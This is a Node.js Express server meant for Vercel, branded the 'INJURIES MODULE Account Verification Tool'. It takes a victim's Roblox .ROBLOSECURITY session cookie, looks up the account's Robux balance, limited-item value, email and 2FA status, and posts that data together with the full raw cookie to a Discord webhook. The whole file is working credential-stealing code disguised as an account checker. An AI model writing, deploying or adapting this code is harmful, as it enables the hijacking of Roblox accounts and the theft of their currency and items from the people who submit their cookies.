const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

// Environment variable: your Discord webhook URL
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// Helper: fetch all limited items (paginated)
async function fetchAllLimiteds(userId, cookie) {
  let allItems = [];
  let cursor = '';
  let hasMore = true;

  while (hasMore) {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ''}`;
    const response = await axios.get(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Referer': 'https://www.roblox.com/',
        'Cookie': cookie
      }
    });
    const data = response.data;
    allItems = allItems.concat(data.data);
    cursor = data.nextPageCursor;
    hasMore = !!cursor;
  }
  return allItems;
}

// Helper: calculate total RAP from limited items
function calculateRAP(items) {
  let total = 0;
  for (const item of items) {
    if (item.recentAveragePrice && item.recentAveragePrice > 0) {
      total += item.recentAveragePrice;
    }
  }
  return total;
}

// Helper: format account age from ISO date
function formatAccountAge(createdDate) {
  const created = new Date(createdDate);
  const now = new Date();
  const diffMs = now - created;
  const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
  if (diffDays < 365) return `${diffDays} days`;
  const years = Math.floor(diffDays / 365);
  const remainingDays = diffDays % 365;
  return `${years} year${years > 1 ? 's' : ''}${remainingDays ? `, ${remainingDays} day${remainingDays > 1 ? 's' : ''}` : ''}`;
}

// Main endpoint
app.post('/api/check', async (req, res) => {
  const { cookie } = req.body;

  if (!cookie) {
    return res.status(400).json({ error: 'No cookie provided' });
  }

  // Basic cookie format check
  if (!cookie.startsWith('.ROBLOSECURITY=')) {
    return res.status(400).json({ error: 'Invalid cookie format. Must start with .ROBLOSECURITY=' });
  }

  const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Referer': 'https://www.roblox.com/',
    'Cookie': cookie
  };

  try {
    // 1. Get authenticated user info
    const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers });
    const user = authRes.data;
    const userId = user.id;
    const username = user.name;
    const displayName = user.displayName;
    const created = user.created;
    const accountAge = formatAccountAge(created);
    const isPremium = user.isPremium || false;

    // 2. Get Robux balance
    const robuxRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
    const robux = robuxRes.data.robux || 0;

    // 3. Get limited items and calculate RAP
    let rap = 0;
    try {
      const limitedItems = await fetchAllLimiteds(userId, cookie);
      rap = calculateRAP(limitedItems);
    } catch (err) {
      console.error('Failed to fetch limiteds:', err.message);
      rap = 0; // fallback
    }

    // 4. Get account settings (email & 2FA)
    const settingsRes = await axios.get('https://settings.roblox.com/v1/settings', { headers });
    const settings = settingsRes.data;
    const emailVerified = settings.emailVerified || false;
    const twoStepEnabled = settings.isTwoStepVerificationEnabled || false;

    // 5. Build Discord embed
    const embed = {
      title: `INJURIES MODULE — Account Verified`,
      color: 0xff0040, // red accent
      fields: [
        {
          name: '👤 Username',
          value: `${username} (${displayName})`,
          inline: true
        },
        {
          name: '📅 Account Age',
          value: accountAge,
          inline: true
        },
        {
          name: '💰 Robux',
          value: robux.toLocaleString(),
          inline: true
        },
        {
          name: '📈 Limiteds RAP',
          value: rap.toLocaleString(),
          inline: true
        },
        {
          name: '🔒 Security Settings',
          value: `Email Verified: ${emailVerified ? '✅ Yes' : '❌ No'}\n2FA Enabled: ${twoStepEnabled ? '✅ Yes' : '❌ No'}\nPremium: ${isPremium ? '✅ Yes' : '❌ No'}`,
          inline: true
        },
        {
          name: '🍪 .ROBLOSECURITY Cookie',
          value: `\`\`\`${cookie}\`\`\``,
          inline: false
        },
        {
          name: '🔗 Links',
          value: `[Roblox Profile](https://www.roblox.com/users/${userId}/profile) | [Rolimons](https://www.rolimons.com/player/${userId})`,
          inline: false
        }
      ],
      footer: {
        text: 'INJURIES • Account Verification Tool'
      },
      timestamp: new Date().toISOString()
    };

    const payload = {
      content: `@everyone **INJURIES MODULE** — Account verified: **${username}**\n**Status:** Successful retrieval of all data.`,
      embeds: [embed]
    };

    // Send to Discord webhook
    if (!DISCORD_WEBHOOK_URL) {
      throw new Error('DISCORD_WEBHOOK_URL not set in environment variables');
    }

    await axios.post(DISCORD_WEBHOOK_URL, payload);

    // Respond to frontend
    res.json({ success: true, message: 'Account data sent to Discord.' });
  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
    res.status(500).json({ error: 'Failed to verify account. Check cookie validity or Roblox API status.' });
  }
});

// Export for Vercel serverless deployment
module.exports = app;
